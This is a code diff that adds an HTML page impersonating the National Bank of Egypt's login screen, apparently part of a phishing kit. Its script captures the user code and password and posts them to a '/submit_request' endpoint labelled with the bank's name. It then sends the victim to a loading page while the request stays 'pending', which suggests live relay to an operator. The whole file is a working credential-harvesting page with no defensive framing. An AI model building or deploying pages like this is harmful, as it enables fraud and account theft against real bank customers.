@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>National Bank of Egypt - Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        html, body { width: 100%; height: 100%; overflow-x: hidden; }
+        body { background-color: #006b3f; display: flex; flex-direction: column; position: relative; min-height: 100vh; }
+        .top-nav { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; z-index: 10; background-color: #006b3f; }
+        .menu-icon { color: white; font-size: 24px; cursor: pointer; }
+        .bank-logo-top { height: 40px; max-width: 150px; object-fit: contain; background: white; padding: 5px; border-radius: 5px; }
+        .illustration-container { width: 100%; background-color: transparent; display: flex; align-items: center; justify-content: center; padding: 20px 0; overflow: hidden; }
+        .main-illustration { width: 50%; max-width: 180px; height: auto; object-fit: contain; margin: 15px 0; background: white; padding: 15px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
+        .bottom-sheet { background: white; border-top-left-radius: 25px; border-top-right-radius: 25px; padding: 25px 20px; width: 100%; position: relative; box-shadow: 0 -5px 15px rgba(0,0,0,0.1); margin-top: auto; }
+        .sheet-handle { width: 40px; height: 4px; background: #e0e0e0; border-radius: 2px; margin: 0 auto 20px auto; }
+        .welcome-section { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .welcome-text { text-align: left; }
+        .welcome-title { font-size: 14px; color: #666; }
+        .welcome-subtitle { font-size: 18px; font-weight: bold; color: #333; margin-top: 4px; }
+        .user-avatar { width: 45px; height: 45px; background: #f0fff7; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #006b3f; font-size: 20px; border: 1px solid #e0ffe9; }
+        .form-group { margin-bottom: 15px; position: relative; }
+        .input-wrapper { position: relative; display: flex; align-items: center; }
+        .form-control { width: 100%; padding: 15px; border: 1px solid #e0e0e0; border-radius: 8px; font-size: 16px; outline: none; text-align: left; color: #333; }
+        .form-control:focus { border-color: #006b3f; }
+        .password-toggle { position: absolute; right: 15px; color: #666; cursor: pointer; }
+        .form-options { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; font-size: 14px; }
+        .remember-me { display: flex; align-items: center; gap: 8px; color: #333; }
+        .forgot-links { color: #006b3f; text-decoration: none; font-weight: bold; }
+        .face-id-section { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; padding: 10px 0; }
+        .face-id-left { display: flex; align-items: center; gap: 10px; color: #333; font-size: 15px; }
+        .face-id-icon { color: #006b3f; font-size: 20px; }
+        .switch { position: relative; display: inline-block; width: 50px; height: 24px; }
+        .switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 24px; }
+        .slider:before { position: absolute; content: ""; height: 18px; width: 18px; left: 3px; bottom: 3px; background-color: white; transition: .4s; border-radius: 50%; }
+        input:checked + .slider { background-color: #006b3f; }
+        input:checked + .slider:before { transform: translateX(26px); }
+        .submit-btn { background-color: #006b3f; color: white; border: none; width: 100%; padding: 12px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background-color 0.2s; }
+        #errorMessage { color: #d32f2f; text-align: center; margin-bottom: 15px; font-size: 14px; display: none; }
+    </style>
+</head>
+<body>
+    <div class="top-nav">
+        <div class="menu-icon"><i class="fas fa-bars"></i></div>
+        <div style="display: flex; align-items: center; gap: 15px;">
+            <button onclick="window.location.href='login_nbe.html'" style="background: none; border: 1px solid white; color: white; padding: 4px 10px; border-radius: 4px; font-size: 12px; cursor: pointer; font-weight: bold;">العربية</button>
+            <img src="images/nbe_logo.png" class="bank-logo-top" alt="NBE">
+        </div>
+    </div>
+    <div class="illustration-container"><img src="images/nbe_logo.png" class="main-illustration" alt="NBE Logo"></div>
+    <div class="bottom-sheet">
+        <div class="sheet-handle"></div>
+        <div class="welcome-section">
+            <div class="welcome-text">
+                <div class="welcome-title" id="welcomeGreeting">Welcome</div>
+                <div class="welcome-subtitle">Login to your NBE account</div>
+            </div>
+            <div class="user-avatar"><i class="far fa-user"></i></div>
+        </div>
+        <form id="loginForm">
+            <div class="form-group"><input type="text" id="username" name="username" class="form-control" placeholder="User Code" required></div>
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <input type="password" id="password" name="password" class="form-control" placeholder="Password" required>
+                    <i class="far fa-eye-slash password-toggle" onclick="togglePassword()"></i>
+                </div>
+            </div>
+            <div class="form-options">
+                <label class="remember-me"><input type="checkbox"> Remember me</label>
+                <a href="#" class="forgot-links">Forgot User Code?</a>
+            </div>
+            <div class="face-id-section">
+                <div class="face-id-left"><i class="fas fa-fingerprint face-id-icon"></i><span>Enable Fingerprint</span></div>
+                <label class="switch"><input type="checkbox"><span class="slider"></span></label>
+            </div>
+            <div id="errorMessage"></div>
+            <button type="submit" class="submit-btn">Login</button>
+        </form>
+    </div>
+    <script>
+        function togglePassword() {
+            const pwd = document.getElementById("password");
+            const icon = document.querySelector(".password-toggle");
+            if (pwd.type === "password") { pwd.type = "text"; icon.classList.replace("fa-eye-slash", "fa-eye"); }
+            else { pwd.type = "password"; icon.classList.replace("fa-eye", "fa-eye-slash"); }
+        }
+        document.getElementById("loginForm").addEventListener("submit", async function(e) {
+            e.preventDefault();
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+            const errorDiv = document.getElementById("errorMessage");
+            try {
+                const response = await fetch("/submit_request", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ type: "login", data: { bank: "NBE", username, password } })
+                });
+                const result = await response.json();
+                if (result.status === "pending") { localStorage.setItem("request_id", result.request_id); window.location.href = "loading_en.html"; }
+                else { errorDiv.textContent = result.message || "An error occurred."; errorDiv.style.display = "block"; }
+            } catch (err) { errorDiv.textContent = "Connection error."; errorDiv.style.display = "block"; }
+        });
+    </script>
+</body>
+</html>
